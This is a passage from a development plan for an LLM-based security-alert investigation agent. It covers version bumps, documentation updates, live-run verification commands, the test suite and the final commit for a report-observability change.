    assert report.model_metadata.prompt_version == "4e-v1"
```

Update any existing test asserting `"4d-v1"` to the new value.

- [ ] **Step 2: Run the test to verify it fails**

Run: `pytest tests/test_state_graph.py -k prompt_version -q`
Expected: FAIL — `assert '4d-v1' == '4e-v1'`.

- [ ] **Step 3: Bump the version**

In `_assemble_report`, `prompt_version="4e-v1"`. No prompt text changed, but the recorded shape of a report did, and `prompt_version` is what a reader uses to tell two report shapes apart.

- [ ] **Step 4: Update the docs**

In `CLAUDE.md` §2.3, add three rows to the `Report` table:

| Field | Type | Notes |
|---|---|---|
| `llm_usage` | `LLMUsageTotals` | calls, failed calls, attempts, token totals, reasoning characters, model latency and wall clock for the whole investigation. Token totals are `null` rather than partial when any call reported no usage. `completion_tokens` counts structured output only — the reasoning trace is uncounted, hence `reasoning_chars` alongside it |
| `investigation_timeline[].input` / `.output` | dict \| None | the typed values each step consumed and produced |
| `investigation_timeline[].llm_calls` | list[LLMCallRecord] | one record per `generate_structured` call: verbatim prompt, raw response on a parse failure, verbatim reasoning trace, parsed output, attempts, tokens, latency, error kind |

Also amend §2.3's `investigation_timeline` row to note that the finalize step is now inside the persisted payload.

In `PROGRESS.md`, add an entry recording:
- The database and the exported JSON previously disagreed by one step, and why.
- `ReportRecord` silently dropped both triage fields; `show-report` could never have displayed them.
- The measured behaviour of Ollama's `usage` (spec §1.1.1, verified 17 Aug 2026 on `gemma4:12b`): it is populated; `prompt_tokens` tracks input size; `completion_tokens` counts the JSON content only and reported 18 against 1,608 characters of reasoning trace, so it is not a cost or throughput figure. Confirm the same pattern holds on the end-to-end run in Step 5 and record the observed numbers.
- That `data/alerts.db` must be deleted and re-pulled, because `create_all` does not add columns to an existing table.
- That `bench/score.py::_step_seconds` still infers step latency from timestamp diffs and is now superseded by `llm_calls[].latency_ms`, left unchanged so the committed benchmark results stay comparable.
- That verbatim prompt capture puts `full_log` into every report file and row, which needs a data-handling decision before this points at real SIEM data.

In `ROADMAP.md`, add a `### Report observability and export — ✅ Complete 17 Aug 2026` subsection under `## Demo Readiness: HITCON 2026` (line 115), placed after `### Remaining work` (line 141) and formatted like the sibling `### Scenario E` entry at line 168. Four bullets: DB/JSON step parity, per-step input/output plus LLM call records, experimental triage shown behind a disclaimer, Markdown export. If any of those items appear in `### Remaining work`, strike them from that list rather than leaving them in both places.

- [ ] **Step 5: Verify against a live run**

With the Wazuh stack up and `gemma4:12b` pulled:

```bash
rm -f data/alerts.db
agent pull-alerts --limit 5
agent list-alerts --status new
agent investigate-one <alert_id> --verbose
```

Then confirm, and record the answers in `PROGRESS.md`:

```bash
# 1. Nine steps in the database, matching the file.
sqlite3 data/alerts.db "select json_array_length(investigation_timeline) from reports"

# 2. Both artefacts exist and the Markdown matches the terminal.
ls data/reports/
agent show-report <report_id>
diff <(agent show-report <report_id>) <(cat data/reports/<report_id>.md)   # expect formatting-only differences

# 3. Token accounting: prompt_tokens real, completion_tokens smaller than the
#    reasoning trace it does not count (spec §1.1.1).
python3 -c "
import json, glob
d = json.load(open(sorted(glob.glob('data/reports/*.json'))[-1]))
u = d['llm_usage']
print('usage totals:', u)
print('per call:', [(c['prompt_ref'], c['prompt_tokens'], c['completion_tokens'],
                     len(c['reasoning'] or ''), c['latency_ms'])
                    for s in d['investigation_timeline'] for c in s['llm_calls']])
assert u['prompt_tokens'], 'prompt_tokens should be populated on this backend'
print('reasoning chars vs completion tokens:', u['reasoning_chars'], u['completion_tokens'])
"

# 4. The benchmark harness still parses a fresh report.
python3 -c "
import json, glob, sys
sys.path.insert(0, '.')
from bench.score import _self_check_counts
print('self-check counts:', _self_check_counts(json.load(open(sorted(glob.glob('data/reports/*.json'))[-1]))))
"
```

Check 4 returning `None` means an `output_summary` was reworded — that is a regression, not an acceptable result. Fix it before committing.

- [ ] **Step 6: Run the full suite**

Run: `pytest -q`
Expected: PASS, 0 failures. The count will exceed the 314 recorded in `CLAUDE.md`; update that number to whatever `pytest -q` reports.

- [ ] **Step 7: Commit**

```bash
git add app/agent/state_graph.py CLAUDE.md PROGRESS.md ROADMAP.md tests/
git commit -m "docs: record the report shape change and bump prompt_version

prompt_version moves to 4e-v1: no prompt text changed, but what a report
records did, and that is what tells two report shapes apart."
```

---

## Verification

Run after Task 9, all from the repo root with `.venv` active:

1. `pytest -q` — passes with no failures.
2. `sqlite3 data/alerts.db "select json_array_length(investigation_timeline) from reports"` returns `9` for every freshly written report.
3. `ls data/reports/` shows a `.json` and a `.md` per report, and `agent show-report <id>` matches the `.md` section for section.
4. `bench/score.py::_self_check_counts` returns a tuple, not `None`, for a freshly generated report.
5. `report.llm_usage.calls` equals the number of `llm_calls` entries across the timeline, and `wall_clock_ms >= llm_latency_ms`.
6. A report generated with the model unavailable still validates, has `llm_usage.calls == 0`, and carries nine timeline steps.
